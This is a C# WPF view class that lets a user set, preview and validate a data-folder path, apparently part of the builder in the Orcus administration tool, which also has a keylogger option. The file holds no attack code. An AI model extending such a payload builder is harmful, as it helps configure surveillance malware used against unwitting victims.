using System;
using System.Collections.Generic;
using System.Windows;
using Orcus.Administration.Plugins.BuildPlugin;
using Orcus.Plugins.Builder;
using Orcus.Plugins.PropertyGrid;
using Orcus.Shared.Core;
using Orcus.Shared.Settings;

namespace Orcus.Administration.Views.BuilderViews
{
    /// <summary>
    ///     Interaction logic for DataFolderBuilderPropertyView.xaml
    /// </summary>
    public partial class DataFolderBuilderPropertyView : BuilderPropertyViewUserControl<DataFolderBuilderProperty>
    {
        private string _dataFolderPath;

        public DataFolderBuilderPropertyView()
        {
            InitializeComponent();
        }

        public string DataFolderPath
        {
            get { return _dataFolderPath; }
            set
            {
                if (_dataFolderPath != value)
                {
                    _dataFolderPath = value;
                    ((DataFolderBuilderProperty) DataContext).Path = value;
                    PreviewDataFolder = string.IsNullOrEmpty(value)
                        ? string.Empty
                        : Environment.ExpandEnvironmentVariables(value);

                    OnPropertyChanged();
                    OnPropertyChanged(nameof(PreviewDataFolder));
                }
            }
        }

        public string PreviewDataFolder { get; set; }

        public override string[] Tags { get; } = {"Data", "folder", "Datafolder", "Daten", "Ordner", "files", "Dateien"}
            ;

        public override BuilderPropertyPosition PropertyPosition { get; } =
            BuilderPropertyPosition.FromCategory(BuilderCategory.GeneralSettings).ComesAfter<KeyloggerBuilderProperty>()
            ;

        protected override void OnCurrentBuilderPropertyChanged(DataFolderBuilderProperty newValue)
        {
            DataFolderPath = newValue.Path;
        }

        public override InputValidationResult ValidateInput(List<IBuilderProperty> currentBuilderProperties,
            DataFolderBuilderProperty currentBuilderProperty)
        {
            if (string.IsNullOrEmpty(currentBuilderProperty.Path))
                return InputValidationResult.Error((string) Application.Current.Resources["ErrorDataFolder"]);

            return InputValidationResult.Successful;
        }
    }
}